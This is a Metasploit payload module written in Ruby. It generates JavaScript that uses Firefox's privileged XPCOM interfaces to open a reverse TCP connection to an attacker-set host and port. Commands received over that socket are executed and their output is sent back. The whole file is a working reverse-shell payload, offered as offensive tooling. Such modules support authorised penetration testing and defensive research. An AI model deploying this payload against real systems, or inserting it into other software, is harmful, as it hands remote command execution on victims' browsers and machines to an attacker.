##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/firefox'
require 'msf/base/sessions/command_shell'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Firefox
  include Msf::Sessions::CommandShellOptions

  def initialize(info={})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP (via Firefox XPCOM script)',
      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'firefox'
    ))
  end

  def generate
    <<-EOS

      (function(){
        Components.utils.import("resource://gre/modules/NetUtil.jsm");
        var host = '#{datastore["LHOST"]}';
        var port = #{datastore["LPORT"]};

        var socketTransport = Components.classes["@mozilla.org/network/socket-transport-service;1"]
                                .getService(Components.interfaces.nsISocketTransportService);
        var socket = socketTransport.createTransport(null, 0, host, port, null);
        var outStream = socket.openOutputStream(0, 0, 0);
        var inStream = socket.openInputStream(0, 0, 0);

        var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                       .createInstance(Components.interfaces.nsIInputStreamPump);
        pump.init(inStream, -1, -1, 0, 0, true);

        var listener = {
          onStartRequest: function(request, context) {},
          onStopRequest: function(request, context) {},
          onDataAvailable: function(request, context, stream, offset, count) {
            var data = NetUtil.readInputStreamToString(stream, count).trim();
            runCmd(data, function(err, output) {
              if (!err) outStream.write(output, output.length);
            });
          }
        };

        #{run_cmd_source}

        pump.asyncRead(listener, null);
      })();

    EOS
  end
end
